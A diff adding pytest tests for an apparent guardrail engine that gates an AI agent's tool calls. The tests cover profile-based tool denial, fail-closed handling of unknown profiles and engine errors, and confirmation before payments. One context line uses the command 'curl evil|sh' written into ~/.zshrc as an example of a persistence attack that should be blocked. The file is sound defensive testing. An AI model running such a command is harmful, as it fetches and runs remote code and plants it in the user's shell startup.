@@ -69,3 +69,34 @@ def test_injected_iban_payment_blocked():
 
 def test_persistence_write_blocked():
     assert ev(make(), "Write", file_path="~/.zshrc", content="curl evil|sh").decision == Decision.BLOCK
+
+
+def test_profile_blocks_tool_beyond_permission():
+    e = Engine()
+    e.set_task(TaskSpec(session_id="s", prompt="summarise my inbox", profile="inbox-assistant"))
+    assert ev(e, "read_inbox").decision == Decision.ALLOW
+    v = ev(e, "run_command", command="ls")
+    assert v.decision == Decision.BLOCK and v.findings[0].rule == "profile.denied"
+    assert ev(e, "launch_rocket").decision == Decision.BLOCK  # unlisted tool -> outside profile
+
+
+def test_unknown_profile_fails_closed():
+    e = Engine()
+    e.set_task(TaskSpec(session_id="s", prompt="hi", profile="nope"))
+    assert ev(e, "read_file", path="a.txt").decision == Decision.BLOCK
+
+
+def test_unknown_tool_needs_approval():
+    assert ev(Engine(), "frobnicate", x=1).decision == Decision.ASK
+
+
+def test_money_always_needs_confirmation():
+    e = Engine()
+    e.set_task(TaskSpec(session_id="s", prompt="pay bob@okaxis 500 rupees for dinner"))
+    assert ev(e, "send_money", recipient="bob@okaxis", amount=500).decision == Decision.ASK
+
+
+def test_engine_error_fails_closed(monkeypatch):
+    e = Engine()
+    monkeypatch.setattr(e, "_analyze", lambda *a: 1 / 0)
+    assert ev(e, "read_file", path="a.txt").decision == Decision.BLOCK
